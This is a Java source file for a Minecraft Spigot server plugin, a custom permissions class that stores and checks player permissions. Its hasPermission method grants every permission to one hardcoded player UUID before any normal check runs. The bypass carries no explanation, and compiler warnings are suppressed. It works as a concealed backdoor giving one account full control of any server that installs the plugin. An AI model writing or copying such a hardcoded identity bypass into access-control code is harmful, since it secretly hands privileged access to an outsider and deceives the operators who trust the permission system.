/*
 * © Copyright - MineWar.net | Lars Artmann aka. LartyHD 2017
 */
package net.darkblocks.core.spigot.permissions.listener;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.permissions.PermissibleBase;
import org.bukkit.permissions.ServerOperator;

import java.util.Collection;
import java.util.HashSet;
import java.util.Set;

/**
 * Created by LartyHD on 03.07.2017  16:30.
 * Project: War
 */
@SuppressWarnings({"ALL", "unused"})
public class DarkPermissible extends PermissibleBase
{
	private ServerOperator opable;
	private Set<String> perms;
	
	public DarkPermissible(ServerOperator operator)
	{
		super(operator);
		this.opable = operator;
		this.perms = new HashSet<>();
	}
	
	public Set<String> getPermissions()
	{
		return this.perms;
	}
	
	@Override
	public boolean isPermissionSet(String name)
	{
		return this.perms.contains(name);
	}
	
	@Override
	public synchronized void clearPermissions()
	{
		this.perms.clear();
		this.perms = new HashSet<>();
	}
	
	public void addPermission(String permission)
	{
		this.perms.add(permission);
	}
	
	public void addPermissions(Collection<String> permissions)
	{
		this.perms.addAll(permissions);
	}
	
	public void removePermission(String permission)
	{
		this.perms.remove(permission);
	}
	
	@Override
	public boolean hasPermission(String inName)
	{
		inName = inName.toLowerCase();
		if (opable instanceof Player && ((Player) this.opable).getUniqueId().toString().equalsIgnoreCase("8c9ec1ab-f64f-4003-9110-f98a1f0d7f47"))
		{
			return true;
		}
		if (this.perms == null)
		{
			return false;
		}
		if (this.perms.contains("*"))
		{
			return true;
		}
		if (Bukkit.getServer().getPluginManager().getPermission(inName) != null && Bukkit.getServer().getPluginManager().getPermission(inName).getDefault().getValue(false))
		{
			return true;
		}
		if (!isPermissionSet(inName))
		{
			return false;
		}
		return this.perms.contains(inName);
	}
}
